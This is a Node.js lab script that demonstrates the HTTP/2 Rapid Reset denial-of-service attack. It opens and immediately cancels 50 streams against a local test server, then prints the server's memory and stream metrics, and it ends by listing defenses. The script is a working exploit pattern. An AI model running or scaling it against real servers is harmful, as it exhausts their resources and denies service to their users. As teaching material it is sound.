const http2 = require('http2');

const TARGET_URL = 'https://server:3000';
const DEMO_CONFIG = {
  NORMAL_REQUESTS: 3,
  RAPID_RESET_COUNT: 50,
  DELAY_BETWEEN_RESETS: 50,
  REQUEST_TIMEOUT: 50
};

function createSession() {
  return http2.connect(TARGET_URL, {
    rejectUnauthorized: false,
    timeout: 5000
  });
}

async function demonstrateNormalBehavior() {
  console.log('\nSTEP 1: Normal HTTP/2 requests');
  console.log('------------------------------');

  const session = createSession();
  
  session.on('error', (err) => {
    console.error('Session error:', err.message);
  });

  try {
    console.log('Testing connection...');
    
    for (let i = 1; i <= DEMO_CONFIG.NORMAL_REQUESTS; i++) {
      console.log(`Sending normal request ${i}...`);
      
      try {
        const response = await new Promise((resolve, reject) => {
          const stream = session.request({ ':path': '/metrics' });
          let data = '';
          
          stream.on('response', (headers) => {
            console.log(`Response ${i}: ${headers[':status']}`);
          });
          
          stream.on('data', (chunk) => {
            data += chunk;
          });
          
          stream.on('end', () => {
            resolve(data);
          });
          
          stream.on('error', (err) => {
            reject(err);
          });
          
          stream.end();
        });
        
        const preview = response.substring(0, 100);
        console.log(`Data: ${preview}...`);
        
      } catch (err) {
        console.error(`Request ${i} error:`, err.message);
      }
      
      await new Promise(resolve => setTimeout(resolve, 500));
    }
  } catch (err) {
    console.error('Error in demonstrateNormalBehavior:', err.message);
  } finally {
    try {
      session.close();
    } catch (e) {
    }
  }
}

async function demonstrateRapidReset() {
  console.log('\nSTEP 2: Rapid Reset Attack Demo');
  console.log('-------------------------------');
  console.log(`Sending ${DEMO_CONFIG.RAPID_RESET_COUNT} requests with immediate reset...`);

  const session = createSession();
  session.on('error', (err) => {
    console.error('Rapid reset session error:', err.message);
  });

  let resetCount = 0;

  try {
    for (let i = 1; i <= DEMO_CONFIG.RAPID_RESET_COUNT; i++) {
      try {
        const stream = session.request({ 
          ':path': '/slow',
          ':method': 'GET'
        });

        setTimeout(() => {
          try {
            stream.close();
            resetCount++;
            
            if (i % 5 === 0) {
              console.log(`Reset ${resetCount} streams...`);
            }
          } catch (err) {
          }
        }, DEMO_CONFIG.REQUEST_TIMEOUT);

        await new Promise(resolve => setTimeout(resolve, DEMO_CONFIG.DELAY_BETWEEN_RESETS));
        
      } catch (err) {
        console.error(`Rapid reset ${i} error:`, err.message);
      }
    }

    console.log(`Completed: ${resetCount} streams reset`);

  } catch (err) {
    console.error('Error in demonstrateRapidReset:', err.message);
  } finally {
    try {
      session.close();
    } catch (e) {
    }
  }
}

async function checkServerImpact() {
  console.log('\nSTEP 3: Server Impact Analysis');
  console.log('------------------------------');

  const session = createSession();
  session.on('error', (err) => {
    console.error('Metrics session error:', err.message);
  });

  try {
    const response = await new Promise((resolve, reject) => {
      const stream = session.request({ ':path': '/metrics' });
      let data = '';
      
      stream.on('response', (headers) => {
        console.log(`Response status: ${headers[':status']}`);
      });
      
      stream.on('data', (chunk) => {
        data += chunk;
      });
      
      stream.on('end', () => {
        resolve(data);
      });
      
      stream.on('error', (err) => {
        reject(err);
      });
      
      stream.end();
    });
    
    const metrics = JSON.parse(response);
    console.log('\nServer metrics after attack:');
    console.log(`   • Total requests: ${metrics.totalRequests}`);
    console.log(`   • Active streams: ${metrics.activeStreams}`);
    console.log(`   • Reset streams: ${metrics.resetStreams}`);
    console.log(`   • Memory RSS: ${Math.round(metrics.memoryUsage.rss / 1024 / 1024)} MB`);
    console.log(`   • Uptime: ${Math.round(metrics.uptime / 1000)} seconds`);
    
  } catch (err) {
    console.error('Error fetching metrics:', err.message);
  } finally {
    try {
      session.close();
    } catch (e) {
    }
  }
}

async function runEducationalDemo() {
  try {
    await demonstrateNormalBehavior();
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    await demonstrateRapidReset();
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    await checkServerImpact();
    
    console.log('\nDemo completed successfully!');
    console.log('\nEDUCATIONAL CONCLUSIONS:');
    console.log('• Rapid Reset exploits HTTP/2 asymmetry');
    console.log('• Client can quickly reset streams');
    console.log('• Server must maintain state for each stream');
    console.log('• This can lead to server resource exhaustion');
    console.log('• Defense: rate limiting, monitoring, timeouts');
    
  } catch (error) {
    console.error('\nError during demonstration:', error.message);
    console.log('\nTroubleshooting:');
    console.log('1. Check if server is running: node server/server.js');
    console.log('2. Check if port 3000 is available');
    console.log('3. Check if certificates exist in server/ folder');
    console.log('4. Try running server on different port');
    
    if (error.code === 'ECONNREFUSED') {
      console.log('\nProblem: Server not responding on port 3000');
      console.log('   Run server in separate terminal before running client');
    }
  }
}

if (require.main === module) {
  runEducationalDemo();
}